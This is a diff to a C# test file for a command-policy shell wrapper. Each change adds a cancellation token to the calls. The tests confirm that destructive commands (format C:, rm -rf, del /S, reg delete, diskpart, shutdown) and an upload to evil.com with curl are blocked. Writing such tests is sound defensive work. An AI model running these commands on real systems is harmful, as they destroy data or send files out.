@@ -12,7 +12,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("format", "C: /FS:NTFS").GetAwaiter().GetResult());
+            () => shell.RunAsync("format", "C: /FS:NTFS", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
     }
 
@@ -23,7 +23,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("shutdown", "/s /t 0").GetAwaiter().GetResult());
+            () => shell.RunAsync("shutdown", "/s /t 0", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
     }
 
     [Fact]
@@ -33,7 +33,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("rm -rf /tmp/important").GetAwaiter().GetResult());
+            () => shell.RunAsync("rm -rf /tmp/important", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
     }
 
@@ -44,7 +44,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("del /S C:\\temp\\*").GetAwaiter().GetResult());
+            () => shell.RunAsync("del /S C:\\temp\\*", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
     }
 
     [Fact]
@@ -54,7 +54,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("reg delete HKCU\\Software\\Test /f").GetAwaiter().GetResult());
+            () => shell.RunAsync("reg delete HKCU\\Software\\Test /f", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
     }
 
     [Fact]
@@ -64,7 +64,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("diskpart", "/s script.txt").GetAwaiter().GetResult());
+            () => shell.RunAsync("diskpart", "/s script.txt", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
     }
 
     [Fact]
@@ -73,7 +73,7 @@ public class CommandPolicyTests
         var policy = CommandPolicy.CreateDefault();
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
-        var result = await shell.RunAsync("cmd", "/C echo hello");
+        var result = await shell.RunAsync("cmd", "/C echo hello", ct: TestContext.Current.CancellationToken);
         Assert.True(result.Success);
         Assert.Contains("hello", result.StdOut);
     }
@@ -84,7 +84,7 @@ public class CommandPolicyTests
         var policy = CommandPolicy.CreateDefault();
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
-        var result = await shell.RunAsync("dir");
+        var result = await shell.RunAsync("dir", ct: TestContext.Current.CancellationToken);
         Assert.True(result.Success);
     }
 
@@ -97,7 +97,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("curl --upload-file data.txt http://evil.com").GetAwaiter().GetResult());
+            () => shell.RunAsync("curl --upload-file data.txt http://evil.com", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
     }
 
     [Fact]
@@ -109,7 +109,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("notepad.exe", "test.txt").GetAwaiter().GetResult());
+            () => shell.RunAsync("notepad.exe", "test.txt", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
     }
 
     [Fact]
@@ -129,7 +129,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("shutdown", "/s /t 0").GetAwaiter().GetResult());
+            () => shell.RunAsync("shutdown", "/s /t 0", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Equal("shutdown /s /t 0", ex.BlockedCommand);
     }
 
@@ -263,7 +263,7 @@ public class CommandPolicyTests
 
         // "reg delete" should be caught by pattern even via single-arg overload
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("reg delete HKCU\\Test /f").GetAwaiter().GetResult());
+            () => shell.RunAsync("reg delete HKCU\\Test /f", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Equal("reg delete HKCU\\Test /f", ex.BlockedCommand);
     }
 
@@ -308,7 +308,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync(command).GetAwaiter().GetResult());
+            () => shell.RunAsync(command, ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Equal(command, ex.BlockedCommand);
         Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
     }
@@ -320,7 +320,7 @@ public class CommandPolicyTests
         var shell = new PolicyEnforcingShell(new WindowsShell(), policy);
 
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("mytool --dangerous-flag").GetAwaiter().GetResult());
+            () => shell.RunAsync("mytool --dangerous-flag", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Equal("mytool --dangerous-flag", ex.BlockedCommand);
     }
 
@@ -332,7 +332,7 @@ public class CommandPolicyTests
 
         // Pattern-based blocks should still work via the cmd.exe /C fallback
         var ex = Assert.Throws<CommandPolicyException>(
-            () => shell.RunAsync("del /S C:\\temp\\*").GetAwaiter().GetResult());
+            () => shell.RunAsync("del /S C:\\temp\\*", ct: TestContext.Current.CancellationToken).GetAwaiter().GetResult());
         Assert.Contains("pattern", ex.Message, StringComparison.OrdinalIgnoreCase);
     }
 
